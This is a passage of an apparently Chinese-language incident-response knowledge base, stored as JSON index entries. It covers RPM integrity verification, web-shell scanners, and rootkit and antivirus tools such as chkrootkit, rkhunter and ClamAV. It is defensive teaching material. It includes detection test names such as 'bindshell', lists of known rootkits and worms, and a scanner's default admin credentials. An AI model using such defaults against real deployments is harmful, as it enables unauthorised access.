\"templates\": \"256\", \"total\": \"352\" }被动扫描功能 nucleus引擎支持利用文件支持对基于HTTP的模板进行被动模式扫描，有了这种支持，我们可以对从任何其他工具收集的本地存储的HTTP响应数据运行基于HTTP的模板。\nnuclei -passive -target http_data被动模式对具有{{BasedURL}}或{{BasedURL/}}作为基路径的模板的支持是有限的。\n参考：\nhttps://blog.projectdiscovery.io/nuclei-v2-4-0-release/\n模版细节 get-start https://nuclei.projectdiscovery.io/templating-guide/\n每个模版都有一个独一无二的ID用于输出相关名称\n",
    "description": "",
    "tags": null,
    "title": "漏洞验证工具nuclei官方文档中文译文归档",
    "uri": "/%E5%B7%A5%E5%85%B7/%E6%B8%97%E9%80%8F%E5%B7%A5%E5%85%B7/%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81%E5%B7%A5%E5%85%B7/nuclei%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3%E4%B8%AD%E6%96%87%E8%AF%91%E6%96%87%E5%BD%92%E6%A1%A3/index.html"
  },
  {
    "content": "对于软件包管理器软件检查安装的软件的变动可以参考软件查杀检查rhk工具的使用，该软件已可以充分利用软件包管理器的文件特性进行查找。并且我们可以通过相关内容了解到包管理器中只有RPM和SOLARIS的检查方式提供了除hash之外的其他文件资产检查，因此本章节我们手工check相关文件检查的时候重点针对这RPM包管理器的用法进行实践。\nRPM RPM介绍 home： http://rpm.org/\nRPM 是 Red Hat Package Manager 的缩写，本意是Red Hat 软件包管理，顾名思义是Red Hat 贡献出来的软件包管理；在Fedora 、Redhat、Mandriva、SuSE、YellowDog等主流发行版本，以及在这些版本基础上二次开发出来的发行版采用；\nRPM Package Manager (RPM)是一款功能强大的软件包管理系统\n将计算机软件从源代码构建成易于分发的软件包\n安装、更新和卸载软件包\n查询软件包的详细信息，无论软件包是否已安装\n校验软件包和结果软件安装的完整性\nFedora 和Red Hat Linux操作系统默认使用RPM包管理器进行软件管理，同yum，up2date，apt等等命令一样。\nRPM基本用法 rpm [-acdhilqRsv][-b\u003c完成阶段\u003e\u003c套间档\u003e+][-e\u003c套件挡\u003e][-f\u003c文件\u003e+][-i\u003c套件档\u003e][-p\u003c套件档\u003e＋][-U\u003c套件档\u003e][-vv][–addsign\u003c套件档\u003e+][–allfiles][–allmatches][–badreloc][–buildroot\u003c根目录\u003e][–changelog][–checksig\u003c套件档\u003e+][–clean][–dbpath\u003c数据库目录\u003e][–dump][–excludedocs][–excludepath\u003c排除目录\u003e][–force][–ftpproxy\u003c主机名称或IP地址\u003e][–ftpport\u003c通信端口\u003e][–help][–httpproxy\u003c主机名称或IP地址\u003e][–httpport\u003c通信端口\u003e][–ignorearch][–ignoreos][–ignoresize][–includedocs][–initdb][justdb][–nobulid][–nodeps][–nofiles][–nogpg][–nomd5][–nopgp][–noorder][–noscripts][–notriggers][–oldpackage][–percent][–pipe\u003c执行指令\u003e][–prefix\u003c目的目录\u003e][–provides][–queryformat\u003c档头格式\u003e][–querytags][–rcfile\u003c配置档\u003e][–rebulid\u003c套件档\u003e][–rebuliddb][–recompile\u003c套件档\u003e][–relocate\u003c原目录\u003e=\u003c新目录\u003e][–replacefiles][–replacepkgs][–requires][–resign\u003c套件档\u003e+][–rmsource][–rmsource\u003c文件\u003e][–root\u003c根目录\u003e][–scripts][–setperms][–setugids][–short-circuit][–sign][–target=\u003c安装平台\u003e+][–test][–timecheck\u003c检查秒数\u003e][–triggeredby\u003c套件档\u003e][–triggers][–verify][–version][–whatprovides\u003c功能特性\u003e][–whatrequires\u003c功能特性\u003e]\n-a 查询所有套件。 -b\u003c完成阶段\u003e\u003c套件档\u003e+或-t \u003c完成阶段\u003e\u003c套件档\u003e+ 设置包装套件的完成阶段，并指定套件档的文件名称。 -c 只列出组态配置文件，本参数需配合\"-l\"参数使用。 -d 只列出文本文件，本参数需配合\"-l\"参数使用。 -e\u003c套件档\u003e或--erase\u003c套件档\u003e 删除指定的套件。 -f\u003c文件\u003e+ 查询拥有指定文件的套件。 -h或--hash 套件安装时列出标记。 -i 显示套件的相关信息。 -i\u003c套件档\u003e或--install\u003c套件档\u003e 安装指定的套件档。 -l 显示套件的文件列表。 -p\u003c套件档\u003e+ 查询指定的RPM套件档。 -q 使用询问模式，当遇到任何问题时，rpm指令会先询问用户。 -R 显示套件的关联性信息。 -s 显示文件状态，本参数需配合\"-l\"参数使用。 -U\u003c套件档\u003e或--upgrade\u003c套件档\u003e 升级指定的套件档。 -v 显示指令执行过程。 -vv 详细显示指令执行过程，便于排错。 -addsign\u003c套件档\u003e+ 在指定的套件里加上新的签名认证。 --allfiles 安装所有文件。 --allmatches 删除符合指定的套件所包含的文件。 --badreloc 发生错误时，重新配置文件。 --buildroot\u003c根目录\u003e 设置产生套件时，欲当作根目录的目录。 --changelog 显示套件的更改记录。 --checksig\u003c套件档\u003e+ 检验该套件的签名认证。 --clean 完成套件的包装后，删除包装过程中所建立的目录。 --dbpath\u003c数据库目录\u003e 设置欲存放RPM数据库的目录。 --dump 显示每个文件的验证信息。本参数需配合\"-l\"参数使用。 --excludedocs 安装套件时，不要安装文件。 --excludepath\u003c排除目录\u003e 忽略在指定目录里的所有文件。 --force 强行置换套件或文件。 --ftpproxy\u003c主机名称或IP地址\u003e 指定FTP代理服务器。 --ftpport\u003c通信端口\u003e 设置FTP服务器或代理服务器使用的通信端口。 --help 在线帮助。 --httpproxy\u003c主机名称或IP地址\u003e 指定HTTP代理服务器。 --httpport\u003c通信端口\u003e 设置HTTP服务器或代理服务器使用的通信端口。 --ignorearch 不验证套件档的结构正确性。 --ignoreos 不验证套件档的结构正确性。 --ignoresize 安装前不检查磁盘空间是否足够。 --includedocs 安装套件时，一并安装文件。 --initdb 确认有正确的数据库可以使用。 --justdb 更新数据库，当不变动任何文件。 --nobulid 不执行任何完成阶段。 --nodeps 不验证套件档的相互关联性。 --nofiles 不验证文件的属性。 --nogpg 略过所有GPG的签名认证。 --nomd5 不使用MD5编码演算确认文件的大小与正确性。 --nopgp 略过所有PGP的签名认证。 --noorder 不重新编排套件的安装顺序，以便满足其彼此间的关联性。 --noscripts 不执行任何安装Script文件。 --notriggers 不执行该套件包装内的任何Script文件。 --oldpackage 升级成旧版本的套件。 --percent 安装套件时显示完成度百分比。 --pipe\u003c执行指令\u003e 建立管道，把输出结果转为该执行指令的输入数据。 --prefix\u003c目的目录\u003e 若重新配置文件，就把文件放到指定的目录下。 --provides 查询该套件所提供的兼容度。 --queryformat\u003c档头格式\u003e 设置档头的表示方式。 --querytags 列出可用于档头格式的标签。 --rcfile\u003c配置文件\u003e 使用指定的配置文件。 --rebulid\u003c套件档\u003e 安装原始代码套件，重新产生二进制文件的套件。 --rebuliddb 以现有的数据库为主，重建一份数据库。 --recompile\u003c套件档\u003e 此参数的效果和指定\"--rebulid\"参数类似，当不产生套件档。 --relocate\u003c原目录\u003e=\u003c新目录\u003e 把本来会放到原目录下的文件改放到新目录。 --replacefiles 强行置换文件。 --replacepkgs 强行置换套件。 --requires 查询该套件所需要的兼容度。 --resing\u003c套件档\u003e+ 删除现有认证，重新产生签名认证。 --rmsource 完成套件的包装后，删除原始代码。 --rmsource\u003c文件\u003e 删除原始代码和指定的文件。 --root\u003c根目录\u003e 设置欲当作根目录的目录。 --scripts 列出安装套件的Script的变量。 --setperms 设置文件的权限。 --setugids 设置文件的拥有者和所属群组。 --short-circuit 直接略过指定完成阶段的步骤。 --sign 产生PGP或GPG的签名认证。 --target=\u003c安装平台\u003e+ 设置产生的套件的安装平台。 --test 仅作测试，并不真的安装套件。 --timecheck\u003c检查秒数\u003e 设置检查时间的计时秒数。 --triggeredby\u003c套件档\u003e 查询该套件的包装者。 --triggers 展示套件档内的包装Script。 --verify 此参数的效果和指定\"-q\"参数相同。 --version 显示版本信息。 --whatprovides\u003c功能特性\u003e 查询该套件对指定的功能特性所提供的兼容度。 --whatrequires\u003c功能特性\u003e 查询该套件对指定的功能特性所需要的兼容度。RPM常见用法 # 安装数据包 rpm -i package.rpm rpm -ivh package.rpm # -v是可视化，-h是hash标记 rpm -Uvh new-package.rpm # -U安装新包删除旧包 rpm -Uvh --oldpackage Samba-old-version.rpm # 如果只想安装旧包不想安装新包则可使用--oldpackage # 查找程序属于哪个RPM包 \u003erpm -qf /usr/bin/smbmount samba-client-3.0.2-7.FC1 # 查看某命令安装了哪些文件 -l标准输出清单 rpm -ql cpp # 查看某包安装哪些文件 -p指定包名 rpm -qpl cpp-3.3.2-1.i386.rpm # 查看包的安装时间 rpm -qa --queryformat '%{installtime} %{installtime:date} %{name}-%{version}\\n' | sort -n | sed 's/^[0-9]*//' rpm -qa -last | tac # 移除包，-e是移除指令，package.rpm是目标 rpm -e package # 模拟移除，--test测试移除过程是否会遇到任何问题， rpm -ivh --test new-kernel.rpm # 更新或删除软件包时，可以通过--repackage来备份删除的软件包 rpm -Uvh --repackage new-package.rpm rpm -e --repackage package 备份的文件一般会放在RPM备份目录中通常是/var/spool/repackage(可以通过rpm --showrc命令查看) # 重新安装备份中的软件包 rpm -Uvh --oldpackage /var/spool/repackage/old-package.rpm # 查询依赖包，如果有其他的包依赖A包，那么A包是无法被移除的，可以通过以下命令查看有哪些程序依赖相关包 rpm -q --whatrequires kernel # rpm -q --whatrequires kernel 查看有哪些程序依赖kernel包 prelink-0.3.0-13 tcpdump-3.7.2-7.1 iptables-1.2.9-1.0 nfs-utils-1.0.6-1 libpcap-0.7.2-7.1 rp-pppoe-3.5-8 kernel-pcmcia-cs-3.1.31-13 vconfig-1.8-1 sndconfig-0.70-2 pciutils-2.1.10-8 quota-3.06-11RPM检查 系统完整性可以通过rpm自带的-Va来校验检查所有的rpm软件包，查看哪些命令是否被替换了：\n./rpm -Va \u003e rpm.log如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是8位长字符串，每个字符都用以表示文件与RPM数据库中一种属性的比较结果 ，如果是. (点) 则表示测试通过。\n验证内容中的8个信息的具体内容如下： S 文件大小是否改变 M 文件的类型或文件的权限（rwx）是否被改变 5 文件MD5校验是否改变（可以看成文件内容是否改变） D 设备中，从代码是否改变 L 文件路径是否改变 U 文件的属主（所有者）是否改变 G 文件的属组是否改变 T 文件的修改时间是否改变如果命令被替换了，如果还原回来：\n文件提取还原案例： rpm -qf /bin/ls 查询ls命令属于哪个软件包 mv /bin/ls /tmp 先把ls转移到tmp目录下，造成ls命令丢失的假象 rpm2cpio /mnt/cdrom/Packages/coreutils-8.4-19.el6.i686.rpm | cpio -idv ./bin/ls 提取rpm包中ls命令到当前目录的/bin/ls下 cp /root/bin/ls /bin/ 把ls命令复制到/bin/目录 修复文件丢失参考：\nhttps://www.cnblogs.com/xiaochaohuashengmi/archive/2011/10/08/2203153.html\nhttps://www.runoob.com/linux/linux-comm-rpm.html\nrpm2cpiohttp://ftp.rpm.org/max-rpm/s1-rpm-miscellania-rpm2cpio.html\n",
    "description": "",
    "tags": null,
    "title": "linux软件包管理器文件检查",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/linux%E8%BD%AF%E4%BB%B6%E5%8C%85%E7%AE%A1%E7%90%86%E5%99%A8%E6%96%87%E4%BB%B6%E6%A3%80%E6%9F%A5/index.html"
  },
  {
    "content": "linux下后门查杀 牧云（18年已停止更新） CloudWalker（牧云）是长亭推出的一款开源服务器安全管理平台。根据项目计划会逐步覆盖服务器资产管理、威胁扫描、Webshell扫描查杀、基线检测等各项功能。目前开源版go编写，停留在18年版。\nhttps://github.com/chaitin/cloudwalker\n使用方法\n./webshell-detector -html -output result.html /path/to/web-root/\n河马（linux） 拥有海量webshell样本，形成科学查杀鉴定标准，可对同行产品进行查杀能力测评。\nhttp://www.shellpub.com\nlinux用法\n./hm scan 你的web目录 # 保存为result.csv文件 ./hm deepscan 你的web目录 扫描时开启深度解码windows下后门查杀 D盾 D盾_防火墙』专为IIS设计的一个主动防御的保护软件,以内外保护的方式 防止网站和服务器给入侵,在正常运行各类网站的情 况下，越少的功能，服务器越安全的理念而设计！ 限制了常见的入侵方法，让服务器更安全!\nhttp://www.d99net.net/\n直接下载使用\nhttp://www.d99net.net/News.asp?id=106\n河马（windows） 拥有海量webshell样本，形成科学查杀鉴定标准，可对同行产品进行查杀能力测评。\nhttp://www.shellpub.com\nhttps://www.shellpub.com/doc/hm_win_usage.html\n运行程序即可\n查看帮助\nhm -h查看版本\nhm version扫描后门\nhm scan 你的web目录 扫描完成之后结果会保存为result.csv文件，使用记事本或者excel打开查看升级\nhm update服务形式查杀工具 百度webdir+（需要联网） https://scanner.baidu.com/\n您可以通过如下方式提交需要扫描的文件，比如要扫描的文件为 web.zip，那么您需要执行如下命令，\ncurl https://scanner.baidu.com/enqueue -F archive=@web.zip如果上传成功，您将会获取到一串JSON\n{ \"status\": 0, \"descr\": \"Task enqueued\", \"md5\": \"b786fd0010f171cb85803eca877eb9d0\", \"url\": \"https://scanner.baidu.com/result/b786fd0010f171cb85803eca877eb9d0\" }其中URL的值表示扫描结果地址，您可以使用如下命令获取，\ncurl https://scanner.baidu.com/result/b786fd0010f171cb85803eca877eb9d0同样，您会获取到一串JSON\n[ { // 文件 md5 \"md5\": \"b786fd0010f171cb85803eca877eb9d0\", // 一共多少文件 \"total\": 1, // 检测出多少 \"detected\": 1, // 扫描状态 \"status\": \"done\", // 已经扫描了多少文件 \"scanned\": 1, // 检测结果 \"data\": [ { // 文件相对路径 \"path\": \"/b786fd0010f171cb85803eca877eb9d0.php\", // 检测结果 \"descr\": \"BDS.WebShell.Chopper.1\" } ]另外，我们支持批量获取检测结果，e.g\ncurl https://scanner.baidu.com/result/b786fd0010f171cb85803eca877eb9d0,b786fd0010f171cb85803eca877eb9d0Web Shell Detector（维护终止）（本地web服务） 项目地址（断更很久了）：https://github.com/emposha/PHP-Shell-Detector\npython客户端（可以选择在线/离线获取特征库，但是项目16年后断更了）：https://github.com/emposha/Shell-Detector\n启动Web Shell Detector:\n上传shelldetect.php和shelldetect.db到web根目录下 在浏览器中打开shelldetect.php如 http://www.website.com/shelldetect.php 使用默认用户名和密码登录 Username: admin Password: protect\n检查所有的奇怪的文件也可以提交到在线平台 http://www.shelldetector.com 各厂商的EDR产品、杀毒软件、监测软件等产品 参考：\nhttps://www.uedbox.com/post/51754/\nhttps://www.shellpub.com/doc/hm_linux_usage.html\n",
    "description": "",
    "tags": null,
    "title": "web后门查杀",
    "uri": "/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/0x02%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/4%E7%B3%BB%E7%BB%9F%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E5%85%B3%E9%94%AE%E8%AF%81%E6%8D%AE%E6%A3%80%E7%B4%A2%E6%8F%90%E5%8F%96/web%E5%90%8E%E9%97%A8%E6%A3%80%E6%9F%A5/index.html"
  },
  {
    "content": "linux下病毒查杀 大部分情况，现场是不允许向机器中拷贝程序的，一破坏现场，二使用不明原理的程序对客户业务系统可能造成未知的影响。在更为严格的情形下，可能我们在现场机器查询命令都是会影响证据固定，因此那种场景下需要先镜像，而后在分析证据的时候进行查杀工作，但这种严格的场景不在本文讨论的范围内。因此本文在查杀过程中，讨论的是不太严格的取证场景下，公司内部或个人主机场景下如何进行病毒查杀以及样本提取工作。第一步需要经允许才可拷贝相关程序，之后我们可以借助一些查杀工具进行检测扫描，最后我们通过现有的异常特征进行手工分析。\nRootkit查杀 rootkit是持久化中是很常见的躲避恶意软件检测的隐藏攻击行为的一类程序，这里一般来说杀软对rootkit具有查杀能力，这里仍然作为了解推荐几个专杀。\nlinux和BSD下后门程序一般最为复杂和严重的是内核级的Rootkit，同样在Windows下Rootkit以及BootKit也是最难清理和危害最大又存活最强的后门程序。在Windows下的Rootkit很多样化但相应检测和清理的工具很多种，linux下Rootkit的检测和清理工具相对较少，其中有这两个比较常用：*Chkrootkit*和*RootkitHunter*。（Pestd关于两个工具的使用介绍）\nchkrootkit（rootkit查杀） 官网：http://www.chkrootkit.org\n简介 Chkrootkit是一个本地检查rootkit标志的工具。它包含:\nChkrootkit: 检查系统二进制文件的rootkit篡改的shell脚本。\nifpromisc.c: 表示检查接口是否为混杂模式。\nchklastlog.c: 检查最近日志的删除情况。\nchkwtmp.c:检查WTMP是否被删除。\ncheck_wtmpx.c:检查WTMPX的删除。(仅Solaris)\nchkproc.c: 检查LKM木马的迹象。\nchkdirs.c: 检查LKM木马的迹象。\nstrings.c: 快速和肮脏的字符串替换。\nchkutmp.c: 检查是否删除utmp。\n目前已经支持下列相关命令/服务/程序的检测：\naliens asp bindshell lkm rexedcs sniffer w55808 wted scalper slapper z2 chkutmp OSX_RSPLUG amd basename biff chfn chsh cron crontab date du dirname echo egrep env find fingerd gpm grep hdparm su ifconfig inetd inetdconf identd init killall ldsopreload login ls lsof mail mingetty netstat named passwd pidof pop2 pop3 ps pstree rpcinfo rlogind rshd slogin sendmail sshd syslogd tar tcpd tcpdump top telnetd timed traceroute vdir w write\n目前支持一下rootkits、蠕虫、LKM（linux内核模块）等检测：\n01. lrk3, lrk4, lrk5, lrk6 (and variants); 02. Solaris rootkit; 03. FreeBSD rootkit; 04. t0rn (and variants); 05. Ambient’s Rootkit (ARK); 06. Ramen Worm; 07. rh[67]-shaper; 08. RSHA; 09. Romanian rootkit; 10. RK17; 11. Lion Worm; 12. Adore Worm; 13. LPD Worm; 14. kenny-rk; 15. Adore LKM; 16. ShitC Worm; 17. Omega Worm; 18. Wormkit Worm; 19. Maniac-RK; 20. dsc-rootkit; 21. Ducoci rootkit; 22. x.c Worm; 23. RST.b trojan; 24. duarawkz; 25. knark LKM; 26. Monkit; 27. Hidrootkit; 28. Bobkit; 29. Pizdakit; 30. t0rn v8.0; 31. Showtee; 32. Optickit; 33. T.R.K; 34. MithRa’s Rootkit; 35. George; 36. SucKIT; 37. Scalper; 38. Slapper A, B, C and D; 39. OpenBSD rk v1; 40. Illogic rootkit; 41. SK rootkit. 42. sebek LKM; 43. Romanian rootkit; 44. LOC rootkit; 45. shv4 rootkit; 46. Aquatica rootkit; 47. ZK rootkit; 48. 55808.A Worm; 49. TC2 Worm; 50. Volc rootkit; 51. Gold2 rootkit; 52. Anonoying rootkit; 53. Shkit rootkit; 54. AjaKit rootkit; 55. zaRwT rootkit; 56. Madalin rootkit; 57. Fu rootkit; 58. Kenga3 rootkit; 59. ESRK rootkit; 60. rootedoor rootkit; 61. Enye LKM; 62. Lupper.Worm; 63. shv5; 64. OSX.RSPlug.A; 65. Linux Rootkit 64Bit; 66. Operation Windigo; 67. Mumblehard backdoor/botnet; 68. Linux.Xor.DDoS Malware; 69. Backdoors.linux.Mokes.a; 70. Linux.Proxy.10 71. Rocke Monero Miner 72. Umbreon Linux Rootkit 目前支持的操作系统：\nLinux 2.0.x, 2.2.x, 2.4.x and 2.6.x, 3x, 4x and 5x. FreeBSD 2.2.x, 3.x, 4.x, 5.x, 7.x and 10.x, OpenBSD 2.x, 3.x, 4.x and 5.x., NetBSD 1.6.x, Solaris 2.5.1, 2.6, 8.0 and 9.0, HP-UX 11, Tru64, BSDI and Mac OS X.\n以上相关内容均可在官网查询到最新内容。\nchkrootkit readme readme ： http://www.chkrootkit.org/README\n编译安装：\nmake sense运行程序：\n需要root权限\n./chkrootkit基本命令 Usage: ./chkrootkit [options] [testname ...] Options: -h show this help and exit -V show version information and exit -l show available tests -d debug -q quiet mode -x expert mode -r dir use dir as the root directory -p dir1:dir2:dirN path for the external commands used by chkrootkit -n skip NFS mounted dirs testname可以是下面的一个或多个： aliens asp bindshell lkm rexedcs sniffer w55808 wted scalper slapper z2 chkutmp amd basename biff chfn chsh cron crontab date du dirname echo egrep env find fingerd gpm grep hdparm su ifconfig inetd inetdconf identd init killall ldsopreload login ls lsof mail mingetty netstat named passwd pidof pop2 pop3 ps pstree rpcinfo rlogind rshd slogin sendmail sshd syslogd tar tcpd tcpdump top telnetd timed traceroute vdir w write基本使用 # 检查ps，ls，sniffer中的问题 ./chkrootkit ps ls sniffer # -q参数为安静模式，此模式下只展示“受影响的”状态的条目 # -x参数，用户可以检查在二进制程序中可疑程序字符，所有的分析在用户侧进行分析，可能发现存在的木马 ./chkrootkit -x | more ./chkrootkit -x | egrep '^/' # chkrootkit使用-p支持，指定文件夹进行测试，多个文件夹使用“:”隔开 ./chkrootkit -p /cdrom/bin ./chkrootkit -p /cdrom/bin:/floppy/mybin # 扫描一个挂载的磁盘使用-r ./chkrootkit -r /mnt 输出的信息：\n\"INFECTED\": 被感染的，代表可能已经被rootkit篡改 \"not infected\": 未被感染的 \"not found\": 测试没有执行，有可能是系统问题，被其他层序使用，使用的-r \"Vulnerable 但不可用\": 系统命令已经被感染但没有启用如果发现了命令被感染了应尽量尽快对命令进行重新安装。\nrkhunter（rootkit查杀） 官网：http://rkhunter.sourceforge.net\n简介 RKH使用条件 在RKH启动之前，它将检查某些必需的命令存在于系统中。这些是典型的命令，比如’cat’， ‘sed’， ‘head’， ’tail’等。如果缺少命令则RKH不能运行。 一些测试需要诸如stat, readlink, sha256或sha256sum。如果这些不存在，那么RKH就会用perl脚本自动替代。然而，这个操作需要Perl和某些模块支持，如果没有，则将跳过这些测试。Readlink作为脚本提供本身，不使用perl。其他测试将使用其他命令。如果在系统中找不到相关的命令，然后跳过测试。 应该提供下载文件更新的工具。目前支持wget、curl、(e)links、lynx和GET。如果你的系统不允许安装其中任何一个程序，但可以运行perl，您可以使用’bget’从http://www.cpan.org/authors/id/E/EL/ELIJAH/下载更新。如果你用另一个更新RKH的一般方法请让我们知道。此外,用于文件下载的非标准命令可以是在RKH配置文件中配置。 有些测试需要单一用途的工具。RKH不依赖于这些，但一旦找到，它就会利用它们。他们可以提高RKH的检测能力。的工具是: Skdet\n为测试SucKIT, Adore, Adore-NG, UNFshit, UNFkmem and frontkey\nhttp://www.xs4all.nl/~dvgevers/\nUnhide和Unhide -tcp (C版本)\n查找隐藏的端口和进程。 http://unhide.sourceforge.net\n如果没有找到相关的工具，则跳过测试。\nRHK安装 tar zxf rkhunter-\u003cversion\u003e.tar.gz cd rkhunter-\u003cversion\u003e ./installer.sh --install # 其他的一些安装参数 ## 展示一些安装示例 ./installer.sh --examples ## 显示帮助 ./installer.sh --help ## 修改配置文件安装路径 ./installer.sh --layout [path] 在安装程序执行的过程中会安装一个名为\"rkhunter.conf\"的文件到/etc目录下，你可以使用\"--layout\"命令指定安装路径。 如果要创建一个本地的配置文件，这个文件必须命名为\"rkhunter.conf.local\"，你也可以在目录中创建\"rkhunter.d\"目录，目录中存放.conf文件。 在安装过程中如果安装程序发现存在rkhunter.conf文件，那么则会创建一个新的配置文件，但是会重新用新的数字编号命名，你应该重新检查配置文件，同步配置等操作。 RKH脚本将会被安装到： /usr/local/bin # 或者根据安装的过程中--layout指定的目录安装 /usr/local/share/man # man手册安装地点 /usr/local/share/doc # 其他手册安装未知 /var/lib/rkhunter # 语言支持 /usr/local/lib/rkhunter/scripts # rkh支持脚本安装 /usr/local/lib64/rkhunter/scripts # 如果在32位操作系统中，支持脚本安装在此目录。基本使用 ## 在运行RKH之前，当使用--propupd时，会生成一个名为rkhunter.dat的文件用来记录文件基本信息如hash、权限、gid等。如下命令 rkhunter --propupd ## 如果想要指定包管理工具那么应该加上如下命令 rkhunter --propupd --pkgmgr RPM ## 使用管理员权限运行程序，即可 rkhunter --check/-c ## 日志文件 /var/log/rkhunter.log ## 帮助手册 rkhunter --help独立安装 # RKH支持独立安装，他可以将所有的程序文件安装在同一个目录下 1. 解压RKH，使用下面的命令安装程序 ./installer.sh --layout custom . --install 2. 切换目录到文件目录中 根据需要对rkhunter.conf配置文件自定义 3. 使用root权限运行rkh ./rkhunter --propupd --check --sk免安装使用RKH 免安装模式可以很方便测试新版本，或应对开发场景。\n1. 首先使用root用户权限，这里建议在tmp目录下创建个临时目录。 mkdir /tmp/rkh cd /tmp/rkh 2. 下载或复制安装包到本目录中，最新的开发版本软件可以通过下面的链接下载 wget http://rkhunter.sourceforge.net/rkhunter-dev.tar.gz 3. 解压 tar xzf rkhunter-dev.tar.gz # 开发版本 tar xzf rkhunter-1.4.0.tar.gz # 正式生产版本 gunzip rkhunter-dev.tar.gz tar xf rkhunter-dev.tar 4. 进入解压的目录并执行安装程序 cd rkhunter-1.4.0/cd rkhunter # 使用独立安装方式安装 ./installer.sh --layout custom . --install # 进入子目录 cd files # 此时rkhunter.conf已经释放在目录中，根据需求进行修改相关配置文件即可。 ./rkhunter --propupd --check --sk # 如果使用了--debug参数，则在/tmp目录中还会生成一个目录 5. 一旦完成了测试，想要删除相关的目录只需要通过下面的命令进行清理即可 cd /tmp /bin/rm -rf rkh卸载安装 RKH支持卸载操作，如果项删除安装的相关文件只需要运行下列相关指令： tar zxf rkhunter-\u003cversion\u003e.tar.gz cd rkhunter-\u003cversion\u003e ./installer.sh --remove如果指定了安装目录，–layout，例如安装在/usr目录下：\n# 卸载命令可以参考 ./installer.sh --layout /usr --remove注意：installer不会移除通过RPM下载的安装包文件。\n在卸载的过程中installer会卸载/etc/rkhunter.conf，其他rkhunter.conf并不会移除。并且rkhunter.d目录也不会移除。可以手动删除相关文件。\n常用参数说明 –propupd 当加propupd参数时，RKH在运行的过程中回对检测的文件建立一个用于判断文件财产改动的基本信息特征数据库，rkhunter.dat文件。改动信息包括：文件hash值、文件权限、uid、gid、inode等等。\n–pkgmgr 指定获取文件信息的方式 文件基本信息操作是通过\"stat\",“file”,“md5sum”,“prelink\"获取的。然而RKH也可以通过数据包管理器获取。通过–pkgmgr指定包管理器。通过包管理器可以避免一些不准确的报告，例如一些程序通过包管理器更新过了，但是因为判断文件发生了变化导致不准确。通过包管理器则可以通过包管理器的数据库对程序进行文件对比从而避免相关问题。\n目前支持的包管理器有：\nRPM - redhat/基于RPM的操作系统\nDPKG - 基于Debian的操作系统\nBSD，BSDng - 使用pkg_info 命令和使用pkg命令管理功能的*BSD操作系统\nSOLARIS - solaris操作系统\nNONE - 默认使用的是NONE，不指定操作系统的情况\n–hash 指定hash文件资产对比 在不信任的包通常使用hash或使用HASH_CMD配置文件选项进行配置。需要注意的是，除了SOLARIS之外其他包管理器都提供文件的hash值的。然而，RPM和SOLARIS包管理器提供其他的文件财产值。例如文件权限,\nuid, gid, 修改事件等。Solaris包管理器可以存储16位hash，但是默认情况下并不会开启，需要在USE_SUNSUM配置选项中开启相关选项。\n而“DPKG”，“BSD”和“BSDng”包管理器只提供文件hash值。例如当执行文件资产检查的时候所有的文件将会重新计算一边hash值，并与rkhunter.dat文件内容进行对比。\n* 因此，–hash模式下只有，“RPM”和“SOLARIS”包管理器才能在文件对比起到比较好的效果*。\n** **\n注意：包管理器数据库有可能会被恶意攻击损坏。在这种情况下，可以使用RKH包管理器选项，不会增加任何安全保障。并且，结果可能会存在不准确。因此RKH只能报告文件变化，并不能判断导致文件变化的原因。\n** **\n** **\n病毒查杀 Clamav（邮件网关病毒查杀） 基本介绍 ClamAV是思科的一个开源(GPLv2)杀毒工具包，专门为邮件网关上的电子邮件扫描而设计。它提供了许多实用工具，包括一个灵活的、可扩展的多线程守护进程、一个命令行扫描器和用于自动数据库更新的高级工具。该包的核心是一个以共享库的形式提供的防病毒引擎。\n官网：https://www.clamav.net/\n官网docs：https://docs.clamav.net/ ClamAV的官方下载地址为：\nhttp://www.clamav.net/download.html\nClamAV设计用于快速扫描文件。\n实时保护(仅Linux)。ClamOnAcc客户端用于ClamD扫描守护进程，在现代版本的Linux上提供实时扫描。这包括一个可选的功能，在文件被扫描之前阻止文件访问(即时访问阻止)。\nClamAV可检测数以百万计的病毒、蠕虫、木马和其他恶意软件，包括Microsoft Office宏病毒、移动恶意软件和其他威胁。\nClamAV的字节码签名运行时由LLVM或我们的自定义字节码解释器提供支持，允许ClamAV签名编写人员创建和分发非常复杂的检测例程，并远程增强扫描仪的功能。\n签名签名数据库确保ClamAV只执行受信任的签名定义。\nClamAV扫描档案和压缩文件，但也保护档案炸弹。内置存档提取功能包括:\nZip (including SFX, excluding some newer or more complex extensions)\nRAR (including SFX, most versions)\n7Zip\nARJ (including SFX)\nTar\nCPIO\nGzip\nBzip2\nDMG\nIMG\nISO 9660\nPKG\nHFS+ partition\nHFSX partition\nAPM disk image\nGPT disk image\nMBR disk image\nXAR\nXZ\nMicrosoft OLE2 (Office documments)\nMicrosoft OOXML (Office documments)\nMicrosoft Cabinet Files (including SFX)\nMicrosoft CHM (Compiled HTML)\nMicrosoft SZDD compression format\nHWP (Hangul Word Processor documents)\nBinHex\nSIS (SymbianOS packages)\nAutoIt\nInstallShield\nESTsoft EGG\n支持Windows可执行文件解析，也称为便携式可执行文件(PE) 32/64位，包括PE文件压缩或混淆:\nAsPack\nUPX\nFSG\nPetite\nPeSpin\nNsPack\nwwpack32\nMEW\nUpack\nY0da Cryptor\n支持ELF和Mach-O文件(32位和64位)\n支持几乎所有的邮件文件格式\n支持其他特殊文件/格式包括:\nHTML\nRTF\nPDF\nFiles encrypted with CryptFF and ScrEnc\nuuencode\nTNEF (winmail.dat)\n高级数据库更新，支持脚本更新，数字签名和基于DNS的数据库版本查询。\n支持的操作系统 